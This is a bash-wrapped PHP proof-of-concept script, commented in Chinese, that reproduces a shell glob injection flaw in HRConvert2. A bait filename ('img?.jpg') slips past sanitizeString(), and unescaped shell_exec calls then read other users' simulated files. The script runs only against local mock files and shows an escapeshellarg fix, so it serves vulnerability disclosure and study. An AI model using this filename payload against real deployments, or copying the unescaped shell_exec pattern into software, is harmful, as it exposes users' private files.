#!/bin/bash
# ============================================================
# HRConvert2 Shell Glob Injection PoC — 一键运行脚本
# 
# 使用方法: chmod +x poc_one_click.sh && ./poc_one_click.sh
# 前提: 系统已安装 PHP (php-cli)
# ============================================================

set -e

echo ""
echo "╔══════════════════════════════════════════════════════════╗"
echo "║  HRConvert2 Shell Glob Injection PoC — 一键复现脚本    ║"
echo "╚══════════════════════════════════════════════════════════╝"
echo ""

# 检查 PHP
if ! command -v php &> /dev/null; then
    echo "[✗] 错误: 未找到 PHP。请安装 php-cli:"
    echo "    Ubuntu/Debian: sudo apt install php-cli"
    echo "    macOS: brew install php"
    exit 1
fi
echo "[✓] PHP 版本: $(php -r 'echo PHP_VERSION;')"

# 创建临时目录
WORKDIR="/tmp/hrconvert2_glob_poc_$$"
mkdir -p "$WORKDIR"
echo "[✓] 工作目录: $WORKDIR"
echo ""

# 写入 PoC PHP 脚本
cat > "$WORKDIR/poc.php" << 'PHPEOF'
<?php
// HRConvert2 原始 sanitizeString() 函数 (convertCore.php:67-73)
function sanitizeString($Variable, $strict) {
  if ($strict) $Variable = htmlentities(trim(trim(str_replace(' ', '_', str_replace('..', '', str_replace('//', '', str_replace(str_split('|\\~#[](){};:$!#^&%@>*<"\'/`'.chr(9).chr(10).chr(13).chr(0)), '', $Variable))))), '-'), ENT_QUOTES, 'UTF-8');
  if (!$strict) $Variable = htmlentities(trim(trim(str_replace(' ', '_', str_replace('..', '', str_replace('//', '', str_replace(str_split('|\\[](){};"\''.'`'.chr(9).chr(10).chr(13).chr(0)), '', $Variable))))), '-'), ENT_QUOTES, 'UTF-8');
  return $Variable;
}

$workdir = $argv[1];
$convertDir = $workdir . '/session_data/';
@mkdir($convertDir, 0777, true);

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
echo "  第1步: 验证 ? 字符通过 sanitizeString(strict)\n";
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n";

$malicious = 'img?.jpg';
$sanitized = sanitizeString($malicious, TRUE);
echo "  输入: '$malicious'\n";
echo "  sanitizeString(strict) 输出: '$sanitized'\n";
echo "  结果: " . (strpos($sanitized, '?') !== false ? "⚠️  ? 未被过滤！漏洞确认" : "? 被过滤了") . "\n\n";

// 对比：哪些危险字符被过滤了
echo "  对比 — 其他危险字符的命运:\n";
$chars = ['|'=>'管道', ';'=>'分号', '&'=>'AND', '`'=>'反引号', '$'=>'美元', 
           '>'=>'重定向', '<'=>'输入', '?'=>'问号glob', '*'=>'星号glob'];
foreach ($chars as $c => $name) {
    $r = sanitizeString("test{$c}file", TRUE);
    $blocked = (strpos($r, $c) === false) ? "已过滤 ✓" : "⚠️ 存活!";
    echo "    $c ($name): $blocked\n";
}

echo "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
echo "  第2步: 模拟 HRConvert2 文件环境\n";
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n";

// 创建模拟文件
file_put_contents($convertDir . 'img1.jpg', 'CONFIDENTIAL_USER_PHOTO_1');
file_put_contents($convertDir . 'img2.jpg', 'CONFIDENTIAL_USER_PHOTO_2');
file_put_contents($convertDir . 'img3.jpg', 'CONFIDENTIAL_USER_PHOTO_3');
file_put_contents($convertDir . 'img?.jpg', 'ATTACKER_BAIT_FILE');

echo "  ConvertDir 中的文件:\n";
foreach (glob($convertDir . '*.jpg') as $f) {
    echo "    " . basename($f) . " (" . filesize($f) . " bytes)\n";
}

echo "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
echo "  第3步: 模拟 verifyFile() 检查\n";
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n";

$pathname = $convertDir . $sanitized;
echo "  检查路径: $pathname\n";
echo "  file_exists(): " . (file_exists($pathname) ? "true ✓ (PHP不做glob展开)" : "false") . "\n";
echo "  verifyFile 结论: 文件验证通过，允许后续操作\n";

echo "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
echo "  第4步: 演示 shell_exec() glob 展开 [核心漏洞]\n";
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n";

echo "  HRConvert2 代码 (convertCore.php line 902):\n";
echo "    \$returnData = shell_exec('convert -background none '.\$pathname.' '.\$newPathname);\n\n";

$newPathname = $convertDir . 'output.png';
echo "  实际拼接的命令:\n";
echo "    convert -background none {$pathname} {$newPathname}\n\n";

// 展示 glob
$expanded = trim(shell_exec('echo ' . $pathname));
$files = explode(' ', $expanded);
echo "  Bash 将 {$pathname} 展开为:\n";
foreach ($files as $f) {
    $tag = (basename($f) === 'img?.jpg') ? '(攻击者上传)' : '⚠️ 非预期匹配!';
    echo "    → $f  $tag\n";
}
echo "\n";
echo "  ⚡ 结果: 本应只处理 1 个文件，实际匹配了 " . count($files) . " 个文件！\n";

// 用 cat 演示实际信息泄露
echo "\n  模拟 convert 读取文件内容（用 cat 替代）:\n";
$leaked = shell_exec('cat ' . $pathname . ' 2>/dev/null');
echo "  ┌─────────────────────────────────────────┐\n";
foreach (explode("\n", trim($leaked)) as $line) {
    echo "  │ $line\n";
}
echo "  └─────────────────────────────────────────┘\n";
echo "  ↑ 攻击者通过 glob 展开读取到了其他文件的内容!\n";

echo "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
echo "  第5步: 正确修复对比\n";
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n";

$safe_expanded = trim(shell_exec('echo ' . escapeshellarg($pathname)));
echo "  修复后命令:\n";
echo "    convert -background none " . escapeshellarg($pathname) . " " . escapeshellarg($newPathname) . "\n\n";
echo "  Bash 解析结果:\n";
echo "    → $safe_expanded  (只有字面文件，无 glob 展开)\n";
echo "  ✓ 安全！\n";

echo "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
echo "  总结\n";
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n";

echo "  漏洞成因:\n";
echo "    1. sanitizeString() 未过滤 ? 字符\n";
echo "    2. shell_exec() 未对变量使用 escapeshellarg()\n";
echo "    3. Bash 对未引用的 ? 进行 glob 展开\n\n";
echo "  攻击影响:\n";
echo "    - ImageMagick 会处理匹配到的所有文件\n";
echo "    - ClamAV 会扫描非预期文件\n";
echo "    - FFmpeg 可能读取非预期输入\n\n";
echo "  修复方案:\n";
echo "    shell_exec('convert ... '.escapeshellarg(\$pathname).' '.escapeshellarg(\$newPathname));\n\n";
PHPEOF

# 运行 PoC
php "$WORKDIR/poc.php" "$WORKDIR"

echo ""
echo "═══════════════════════════════════════════════════════════"
echo " PoC 执行完毕。工作目录: $WORKDIR"
echo " 清理: rm -rf $WORKDIR"
echo "═══════════════════════════════════════════════════════════"
echo ""
